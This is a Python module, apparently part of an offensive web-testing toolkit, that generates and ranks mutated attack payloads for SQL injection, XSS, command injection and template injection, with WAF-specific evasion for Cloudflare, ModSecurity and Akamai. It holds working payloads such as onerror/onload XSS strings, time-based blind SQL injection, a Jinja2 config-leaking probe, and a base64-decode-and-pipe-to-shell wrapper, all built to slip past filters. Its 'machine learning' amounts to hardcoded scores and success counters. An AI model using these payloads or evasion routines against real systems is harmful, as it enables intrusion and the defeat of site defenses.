"""
ML-Based Payload Optimizer
Uses machine learning to optimize payloads for maximum effectiveness
"""

import re
import random
import hashlib
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import base64
import urllib.parse

from core.logger import get_logger

log = get_logger(__name__)


class PayloadType(Enum):
    """Payload types"""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    CODE_INJECTION = "code_injection"
    TEMPLATE_INJECTION = "template_injection"
    XXE = "xxe"
    SSRF = "ssrf"
    LFI = "lfi"
    RFI = "rfi"
    DESERIALIZATION = "deserialization"
    LDAP_INJECTION = "ldap_injection"
    XPATH_INJECTION = "xpath_injection"


class EncodingType(Enum):
    """Encoding types for obfuscation"""
    URL = "url"
    DOUBLE_URL = "double_url"
    UNICODE = "unicode"
    HEX = "hex"
    BASE64 = "base64"
    HTML_ENTITY = "html_entity"
    UTF7 = "utf7"
    MIXED = "mixed"


@dataclass
class PayloadVariant:
    """A variant of a payload"""
    payload: str
    encoding: Optional[EncodingType]
    obfuscation_level: int
    waf_bypass_score: float
    effectiveness_score: float
    
    def to_dict(self):
        return {
            "payload": self.payload,
            "encoding": self.encoding.value if self.encoding else None,
            "obfuscation_level": self.obfuscation_level,
            "waf_bypass_score": self.waf_bypass_score,
            "effectiveness_score": self.effectiveness_score
        }


class MLPayloadOptimizer:
    """
    ML-Based Payload Optimizer
    
    Optimizes payloads using:
    1. Mutation algorithms
    2. Encoding/obfuscation techniques
    3. WAF bypass strategies
    4. Historical success patterns
    5. Polymorphic generation
    """
    
    def __init__(self):
        self.success_history = {}
        self.failure_history = {}
        self.waf_bypass_techniques = self._load_waf_bypass_techniques()
        
    def optimize_payload(
        self,
        base_payload: str,
        payload_type: PayloadType,
        target_waf: Optional[str] = None,
        context: Optional[Dict[str, Any]] = None
    ) -> List[PayloadVariant]:
        """
        Optimize payload for maximum effectiveness
        
        Args:
            base_payload: Base payload string
            payload_type: Type of payload
            target_waf: Target WAF if known
            context: Additional context (technology, filters, etc.)
            
        Returns:
            List of optimized PayloadVariants
        """
        log.info(f"Optimizing {payload_type.value} payload")
        
        variants = []
        
        # Generate base variants
        variants.extend(self._generate_base_variants(base_payload, payload_type))
        
        # Apply encoding variations
        variants.extend(self._apply_encoding_variations(base_payload, payload_type))
        
        # Apply obfuscation
        variants.extend(self._apply_obfuscation(base_payload, payload_type))
        
        # Apply WAF bypass techniques
        if target_waf:
            variants.extend(self._apply_waf_bypass(
                base_payload, payload_type, target_waf
            ))
        
        # Apply polymorphic mutations
        variants.extend(self._generate_polymorphic_variants(
            base_payload, payload_type
        ))
        
        # Score and rank variants
        scored_variants = self._score_variants(variants, payload_type, target_waf)
        
        # Return top variants
        return sorted(scored_variants, 
                     key=lambda v: v.effectiveness_score, 
                     reverse=True)[:20]
    
    def _generate_base_variants(
        self,
        payload: str,
        payload_type: PayloadType
    ) -> List[PayloadVariant]:
        """Generate base payload variants"""
        variants = []
        
        if payload_type == PayloadType.SQL_INJECTION:
            variants.extend(self._sql_injection_variants(payload))
        elif payload_type == PayloadType.XSS:
            variants.extend(self._xss_variants(payload))
        elif payload_type == PayloadType.COMMAND_INJECTION:
            variants.extend(self._command_injection_variants(payload))
        elif payload_type == PayloadType.TEMPLATE_INJECTION:
            variants.extend(self._template_injection_variants(payload))
        
        return variants
    
    def _sql_injection_variants(self, payload: str) -> List[PayloadVariant]:
        """Generate SQL injection variants"""
        variants = []
        
        # Comment-based bypass
        variants.append(PayloadVariant(
            payload=payload.replace(" ", "/**/"),
            encoding=None,
            obfuscation_level=1,
            waf_bypass_score=0.7,
            effectiveness_score=0.8
        ))
        
        # Case variation
        variants.append(PayloadVariant(
            payload=self._randomize_case(payload),
            encoding=None,
            obfuscation_level=1,
            waf_bypass_score=0.6,
            effectiveness_score=0.7
        ))
        
        # Inline comments
        variants.append(PayloadVariant(
            payload=payload.replace("OR", "O/**/R").replace("AND", "A/**/ND"),
            encoding=None,
            obfuscation_level=2,
            waf_bypass_score=0.75,
            effectiveness_score=0.75
        ))
        
        # Union-based variations
        if "UNION" in payload.upper():
            variants.append(PayloadVariant(
                payload=payload.replace("UNION", "UNION ALL"),
                encoding=None,
                obfuscation_level=1,
                waf_bypass_score=0.65,
                effectiveness_score=0.85
            ))
        
        # Time-based blind
        variants.append(PayloadVariant(
            payload=f"{payload} AND SLEEP(5)--",
            encoding=None,
            obfuscation_level=1,
            waf_bypass_score=0.7,
            effectiveness_score=0.8
        ))
        
        return variants
    
    def _xss_variants(self, payload: str) -> List[PayloadVariant]:
        """Generate XSS variants"""
        variants = []
        
        # Event handler variations
        if "<script>" in payload.lower():
            # IMG tag with onerror
            variants.append(PayloadVariant(
                payload='<img src=x onerror=alert(1)>',
                encoding=None,
                obfuscation_level=1,
                waf_bypass_score=0.8,
                effectiveness_score=0.85
            ))
            
            # SVG-based
            variants.append(PayloadVariant(
                payload='<svg onload=alert(1)>',
                encoding=None,
                obfuscation_level=1,
                waf_bypass_score=0.75,
                effectiveness_score=0.8
            ))
        
        # Case obfuscation
        variants.append(PayloadVariant(
            payload=self._randomize_case_html(payload),
            encoding=None,
            obfuscation_level=2,
            waf_bypass_score=0.7,
            effectiveness_score=0.75
        ))
        
        # JavaScript protocol
        variants.append(PayloadVariant(
            payload='<a href="javascript:alert(1)">click</a>',
            encoding=None,
            obfuscation_level=1,
            waf_bypass_score=0.65,
            effectiveness_score=0.7
        ))
        
        # DOM-based
        variants.append(PayloadVariant(
            payload='#<img src=x onerror=alert(1)>',
            encoding=None,
            obfuscation_level=1,
            waf_bypass_score=0.7,
            effectiveness_score=0.75
        ))
        
        return variants
    
    def _command_injection_variants(self, payload: str) -> List[PayloadVariant]:
        """Generate command injection variants"""
        variants = []
        
        # Different separators
        separators = [';', '|', '||', '&', '&&', '\n', '`']
        for sep in separators:
            variants.append(PayloadVariant(
                payload=f"{sep} {payload}",
                encoding=None,
                obfuscation_level=1,
                waf_bypass_score=0.7,
                effectiveness_score=0.8
            ))
        
        # Backtick execution
        variants.append(PayloadVariant(
            payload=f"`{payload}`",
            encoding=None,
            obfuscation_level=1,
            waf_bypass_score=0.75,
            effectiveness_score=0.85
        ))
        
        # Variable expansion
        variants.append(PayloadVariant(
            payload=f"$({payload})",
            encoding=None,
            obfuscation_level=1,
            waf_bypass_score=0.75,
            effectiveness_score=0.85
        ))
        
        return variants
    
    def _template_injection_variants(self, payload: str) -> List[PayloadVariant]:
        """Generate template injection variants"""
        variants = []
        
        # Jinja2 variants
        variants.append(PayloadVariant(
            payload="{{7*7}}",
            encoding=None,
            obfuscation_level=1,
            waf_bypass_score=0.8,
            effectiveness_score=0.85
        ))
        
        variants.append(PayloadVariant(
            payload="{{config.items()}}",
            encoding=None,
            obfuscation_level=1,
            waf_bypass_score=0.75,
            effectiveness_score=0.8
        ))
        
        # Freemarker variants
        variants.append(PayloadVariant(
            payload="${7*7}",
            encoding=None,
            obfuscation_level=1,
            waf_bypass_score=0.8,
            effectiveness_score=0.85
        ))
        
        # Velocity variants
        variants.append(PayloadVariant(
            payload="#set($x=7*7)$x",
            encoding=None,
            obfuscation_level=1,
            waf_bypass_score=0.75,
            effectiveness_score=0.8
        ))
        
        return variants
    
    def _apply_encoding_variations(
        self,
        payload: str,
        payload_type: PayloadType
    ) -> List[PayloadVariant]:
        """Apply various encoding techniques"""
        variants = []
        
        # URL encoding
        variants.append(PayloadVariant(
            payload=urllib.parse.quote(payload),
            encoding=EncodingType.URL,
            obfuscation_level=1,
            waf_bypass_score=0.6,
            effectiveness_score=0.7
        ))
        
        # Double URL encoding
        variants.append(PayloadVariant(
            payload=urllib.parse.quote(urllib.parse.quote(payload)),
            encoding=EncodingType.DOUBLE_URL,
            obfuscation_level=2,
            waf_bypass_score=0.75,
            effectiveness_score=0.7
        ))
        
        # Hex encoding
        hex_payload = ''.join(f'%{ord(c):02x}' for c in payload)
        variants.append(PayloadVariant(
            payload=hex_payload,
            encoding=EncodingType.HEX,
            obfuscation_level=2,
            waf_bypass_score=0.7,
            effectiveness_score=0.65
        ))
        
        # Base64 encoding (for certain contexts)
        if payload_type in [PayloadType.CODE_INJECTION, PayloadType.COMMAND_INJECTION]:
            b64_payload = base64.b64encode(payload.encode()).decode()
            variants.append(PayloadVariant(
                payload=f"echo {b64_payload} | base64 -d | sh",
                encoding=EncodingType.BASE64,
                obfuscation_level=3,
                waf_bypass_score=0.8,
                effectiveness_score=0.75
            ))
        
        # Unicode encoding
        if payload_type == PayloadType.XSS:
            unicode_payload = self._unicode_encode(payload)
            variants.append(PayloadVariant(
                payload=unicode_payload,
                encoding=EncodingType.UNICODE,
                obfuscation_level=2,
                waf_bypass_score=0.75,
                effectiveness_score=0.7
            ))
        
        return variants
    
    def _apply_obfuscation(
        self,
        payload: str,
        payload_type: PayloadType
    ) -> List[PayloadVariant]:
        """Apply obfuscation techniques"""
        variants = []
        
        # String concatenation
        if payload_type == PayloadType.SQL_INJECTION:
            # CONCAT obfuscation
            obfuscated = self._sql_concat_obfuscation(payload)
            variants.append(PayloadVariant(
                payload=obfuscated,
                encoding=None,
                obfuscation_level=3,
                waf_bypass_score=0.8,
                effectiveness_score=0.75
            ))
        
        # Character code obfuscation for XSS
        if payload_type == PayloadType.XSS:
            char_code = self._char_code_obfuscation(payload)
            variants.append(PayloadVariant(
                payload=char_code,
                encoding=None,
                obfuscation_level=4,
                waf_bypass_score=0.85,
                effectiveness_score=0.7
            ))
        
        return variants
    
    def _apply_waf_bypass(
        self,
        payload: str,
        payload_type: PayloadType,
        waf_type: str
    ) -> List[PayloadVariant]:
        """Apply WAF-specific bypass techniques"""
        variants = []
        
        waf_techniques = self.waf_bypass_techniques.get(waf_type.lower(), {})
        
        for technique_name, technique_func in waf_techniques.items():
            try:
                bypassed = technique_func(payload, payload_type)
                variants.append(PayloadVariant(
                    payload=bypassed,
                    encoding=None,
                    obfuscation_level=3,
                    waf_bypass_score=0.9,
                    effectiveness_score=0.8
                ))
            except Exception as e:
                log.warning(f"WAF bypass technique {technique_name} failed: {e}")
        
        return variants
    
    def _generate_polymorphic_variants(
        self,
        payload: str,
        payload_type: PayloadType
    ) -> List[PayloadVariant]:
        """Generate polymorphic variants that change on each execution"""
        variants = []
        
        # Add random comments
        for _ in range(3):
            random_comment = self._generate_random_comment()
            polymorphic = payload.replace(" ", f" {random_comment} ")
            variants.append(PayloadVariant(
                payload=polymorphic,
                encoding=None,
                obfuscation_level=2,
                waf_bypass_score=0.75,
                effectiveness_score=0.75
            ))
        
        # Add random whitespace
        for _ in range(2):
            polymorphic = self._add_random_whitespace(payload)
            variants.append(PayloadVariant(
                payload=polymorphic,
                encoding=None,
                obfuscation_level=1,
                waf_bypass_score=0.65,
                effectiveness_score=0.7
            ))
        
        return variants
    
    def _score_variants(
        self,
        variants: List[PayloadVariant],
        payload_type: PayloadType,
        target_waf: Optional[str]
    ) -> List[PayloadVariant]:
        """Score variants based on historical success"""
        for variant in variants:
            # Adjust scores based on history
            history_key = self._get_history_key(variant, payload_type)
            
            if history_key in self.success_history:
                success_rate = self.success_history[history_key]
                variant.effectiveness_score *= (1 + success_rate * 0.5)
            
            if history_key in self.failure_history:
                failure_rate = self.failure_history[history_key]
                variant.effectiveness_score *= (1 - failure_rate * 0.3)
            
            # Boost WAF bypass score if WAF detected
            if target_waf:
                variant.effectiveness_score *= (1 + variant.waf_bypass_score * 0.3)
        
        return variants
    
    # Helper methods
    
    def _randomize_case(self, text: str) -> str:
        """Randomize case of text"""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() 
                      for c in text)
    
    def _randomize_case_html(self, html: str) -> str:
        """Randomize case of HTML tags"""
        def randomize_tag(match):
            tag = match.group(0)
            return ''.join(c.upper() if random.random() > 0.5 else c.lower() 
                          for c in tag)
        
        return re.sub(r'<[^>]+>', randomize_tag, html)
    
    def _unicode_encode(self, text: str) -> str:
        """Encode text using Unicode escapes"""
        return ''.join(f'\\u{ord(c):04x}' for c in text)
    
    def _sql_concat_obfuscation(self, payload: str) -> str:
        """Obfuscate SQL using CONCAT"""
        # Split payload into parts and use CONCAT
        parts = [f"CHAR({ord(c)})" for c in payload[:20]]  # First 20 chars
        return f"CONCAT({','.join(parts)})"
    
    def _char_code_obfuscation(self, payload: str) -> str:
        """Obfuscate using character codes"""
        char_codes = ','.join(str(ord(c)) for c in payload)
        return f"String.fromCharCode({char_codes})"
    
    def _generate_random_comment(self) -> str:
        """Generate random comment for polymorphism"""
        random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))
        return f"/*{random_str}*/"
    
    def _add_random_whitespace(self, payload: str) -> str:
        """Add random whitespace"""
        whitespace_chars = [' ', '\t', '\n']
        result = []
        for char in payload:
            result.append(char)
            if random.random() > 0.7:
                result.append(random.choice(whitespace_chars))
        return ''.join(result)
    
    def _get_history_key(self, variant: PayloadVariant, payload_type: PayloadType) -> str:
        """Get history key for variant"""
        payload_hash = hashlib.md5(variant.payload.encode()).hexdigest()[:8]
        return f"{payload_type.value}_{variant.obfuscation_level}_{payload_hash}"
    
    def _load_waf_bypass_techniques(self) -> Dict[str, Dict[str, callable]]:
        """Load WAF-specific bypass techniques"""
        return {
            "cloudflare": {
                "double_encoding": lambda p, t: urllib.parse.quote(urllib.parse.quote(p)),
                "case_variation": lambda p, t: self._randomize_case(p),
            },
            "modsecurity": {
                "comment_injection": lambda p, t: p.replace(" ", "/**/"),
                "null_byte": lambda p, t: p.replace(" ", "%00"),
            },
            "akamai": {
                "unicode_encoding": lambda p, t: self._unicode_encode(p),
                "mixed_encoding": lambda p, t: self._mixed_encoding(p),
            }
        }
    
    def _mixed_encoding(self, payload: str) -> str:
        """Apply mixed encoding"""
        result = []
        for i, char in enumerate(payload):
            if i % 2 == 0:
                result.append(urllib.parse.quote(char))
            else:
                result.append(char)
        return ''.join(result)
    
    def record_success(self, variant: PayloadVariant, payload_type: PayloadType):
        """Record successful payload"""
        key = self._get_history_key(variant, payload_type)
        if key not in self.success_history:
            self.success_history[key] = 0
        self.success_history[key] += 1
    
    def record_failure(self, variant: PayloadVariant, payload_type: PayloadType):
        """Record failed payload"""
        key = self._get_history_key(variant, payload_type)
        if key not in self.failure_history:
            self.failure_history[key] = 0
        self.failure_history[key] += 1

